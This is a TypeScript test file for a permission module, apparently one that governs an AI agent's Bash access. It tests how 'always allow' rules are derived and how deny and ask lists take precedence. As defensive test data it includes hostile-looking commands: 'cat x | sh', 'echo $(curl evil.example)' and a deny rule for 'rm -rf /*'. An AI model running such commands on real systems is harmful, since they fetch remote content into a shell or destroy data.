import { describe, expect, test } from "bun:test";
import { deriveAlwaysRule, ruleAlreadyCovered } from "../src/rule-derivation.ts";
import type { PermissionSettings } from "../src/settings.ts";

function bashPreview(command: string): string {
  return JSON.stringify({ command });
}

// §9 scenario 8: rule derivation from Bash - table-driven, since a mis-derived rule is a
// permanent, silent widening of the allowlist.
describe("deriveAlwaysRule", () => {
  test.each([
    [bashPreview('git commit -m "x"'), "Bash(git commit *)"],
    [bashPreview("npm run build"), "Bash(npm run *)"],
    [bashPreview("git status"), "Bash(git status *)"],
    [bashPreview("pwd"), "Bash(pwd *)"],
  ])("derives %p -> %p", (inputPreview, expected) => {
    expect(deriveAlwaysRule("Bash", inputPreview)).toBe(expected);
  });

  test("non-Bash tools generalise to the bare tool name", () => {
    expect(deriveAlwaysRule("Edit", "{}")).toBe("Edit");
    expect(deriveAlwaysRule("Write", "{}")).toBe("Write");
  });

  // §9 scenario 9: metacharacter commands never derive a rule - fall back to allow-once.
  test.each([
    [bashPreview("cat x | sh")],
    [bashPreview("a && b")],
    [bashPreview("echo $(curl evil.example)")],
    [bashPreview("echo `whoami`")],
    [bashPreview("a; b")],
  ])("falls back to null for a metacharacter command: %p", (inputPreview) => {
    expect(deriveAlwaysRule("Bash", inputPreview)).toBeNull();
  });

  test("an empty command derives no rule", () => {
    expect(deriveAlwaysRule("Bash", bashPreview(""))).toBeNull();
    expect(deriveAlwaysRule("Bash", bashPreview("   "))).toBeNull();
  });

  test("derived rules always carry a space before the trailing * (git diff * vs git diff*)", () => {
    const rule = deriveAlwaysRule("Bash", bashPreview("git diff HEAD~1"));
    expect(rule).toBe("Bash(git diff *)");
    expect(rule).not.toBe("Bash(git diff*)");
  });

  test("tolerates a raw (non-JSON) input_preview by treating it as the command itself", () => {
    expect(deriveAlwaysRule("Bash", "git log --oneline")).toBe("Bash(git log *)");
  });
});

// §9 scenario 10: denylist and ask list both beat an Always tap - no allow twin is added for a
// pattern already covered by a deny or ask rule.
describe("ruleAlreadyCovered", () => {
  const settings: PermissionSettings = {
    permissions: {
      deny: ["Bash(rm -rf /*)"],
      ask: ["Bash(git commit *)"],
      allow: ["Bash(git status *)"],
    },
  };

  test("a rule matching an existing deny entry is covered", () => {
    expect(ruleAlreadyCovered("Bash(rm -rf /*)", settings)).toBe(true);
  });

  test("a rule matching an existing ask entry is covered", () => {
    expect(ruleAlreadyCovered("Bash(git commit *)", settings)).toBe(true);
  });

  test("a rule matching an existing allow entry is covered", () => {
    expect(ruleAlreadyCovered("Bash(git status *)", settings)).toBe(true);
  });

  test("a genuinely new rule is not covered", () => {
    expect(ruleAlreadyCovered("Bash(npm test *)", settings)).toBe(false);
  });
});
